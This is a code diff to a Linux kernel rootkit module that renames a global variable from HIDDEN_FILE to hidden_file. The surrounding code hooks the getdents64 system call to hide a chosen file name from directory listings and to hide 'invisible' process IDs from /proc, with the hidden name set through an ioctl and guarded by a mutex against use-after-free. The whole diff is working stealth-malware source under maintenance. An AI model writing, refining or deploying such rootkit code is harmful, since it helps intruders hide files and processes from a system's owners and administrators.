@@ -99,9 +99,9 @@ static struct cdev *kernel_cdev;
 
 /* ---- file hiding state ---- */
 // Points to a static empty string initially; replaced by a kmalloc'd buffer in IOCTL_FILE_HIDE.
-// The empty-string sentinel is checked via *HIDDEN_FILE != '\0' before kfree — do not set to NULL.
-static char *HIDDEN_FILE = "";
-// Protects HIDDEN_FILE against a reader in hacked_getdents64 racing a concurrent
+// The empty-string sentinel is checked via *hidden_file != '\0' before kfree — do not set to NULL.
+static char *hidden_file = "";
+// Protects hidden_file against a reader in hacked_getdents64 racing a concurrent
 // IOCTL_FILE_HIDE writer: without this, the writer's kfree() of the old buffer
 // can run while the reader still holds the stale pointer (use-after-free).
 static DEFINE_MUTEX(hidden_file_lock);
@@ -204,9 +204,9 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 	}
 	rcu_read_unlock();
 
-	pr_debug("HIDDEN_FILE: %s\n", HIDDEN_FILE);
+	pr_debug("hidden_file: %s\n", hidden_file);
 
-	// Hold the lock across the whole scan: HIDDEN_FILE is read (and its contents
+	// Hold the lock across the whole scan: hidden_file is read (and its contents
 	// dereferenced via strlen/memcmp) throughout the loop below, so it must not
 	// be freed/reassigned by a concurrent IOCTL_FILE_HIDE until we're done.
 	mutex_lock(&hidden_file_lock);
@@ -217,10 +217,10 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 		// Guard against malformed dirents with d_reclen == 0; advancing by zero loops forever.
 		if (dir->d_reclen == 0)
 			break;
-		// Hide the entry if: (not in /proc) and its name matches HIDDEN_FILE,
+		// Hide the entry if: (not in /proc) and its name matches hidden_file,
 		// OR (in /proc) and the entry's numeric name is a PF_INVISIBLE pid.
-		name_match = !proc && HIDDEN_FILE && *HIDDEN_FILE != '\0' &&
-			memcmp(HIDDEN_FILE, dir->d_name, strlen(HIDDEN_FILE)) == 0;
+		name_match = !proc && hidden_file && *hidden_file != '\0' &&
+			memcmp(hidden_file, dir->d_name, strlen(hidden_file)) == 0;
 		pid_match = proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10));
 		if (name_match || pid_match) {
 			// First entry: shift remaining dirents left over it, shrink ret.
@@ -381,20 +381,20 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			if (copy_from_user(&file_info, (struct hided_file *)arg, sizeof(struct hided_file)))
 				return -EFAULT;
 			printk(KERN_INFO "Received hidden file: %s, size: %lu\n", file_info.name, file_info.len);
-			// Replace HIDDEN_FILE with a newly allocated buffer holding the filename to suppress from getdents64.
+			// Replace hidden_file with a newly allocated buffer holding the filename to suppress from getdents64.
 			// Reject zero-length to prevent size_t underflow on the null-terminator write below.
 			if (file_info.len == 0 || file_info.len > NAME_LEN)
 				return -EINVAL;
 			mutex_lock(&hidden_file_lock);
-			if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
-				kfree(HIDDEN_FILE);
-			HIDDEN_FILE = kmalloc(file_info.len, GFP_KERNEL);
-			if (!HIDDEN_FILE) {
+			if (hidden_file && *hidden_file != '\0')
+				kfree(hidden_file);
+			hidden_file = kmalloc(file_info.len, GFP_KERNEL);
+			if (!hidden_file) {
 				mutex_unlock(&hidden_file_lock);
 				return -ENOMEM;
 			}
-			memcpy(HIDDEN_FILE, file_info.name, file_info.len);
-			HIDDEN_FILE[file_info.len - 1] = '\0';
+			memcpy(hidden_file, file_info.name, file_info.len);
+			hidden_file[file_info.len - 1] = '\0';
 			mutex_unlock(&hidden_file_lock);
 			break;
 		default:
@@ -481,8 +481,8 @@ static void __exit lkm_exit(void)
 	protect_memory();
 
 	mutex_lock(&hidden_file_lock);
-	if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
-		kfree(HIDDEN_FILE);
+	if (hidden_file && *hidden_file != '\0')
+		kfree(hidden_file);
 	mutex_unlock(&hidden_file_lock);
 
 	pr_info("%s: removed\n", OURMODNAME);
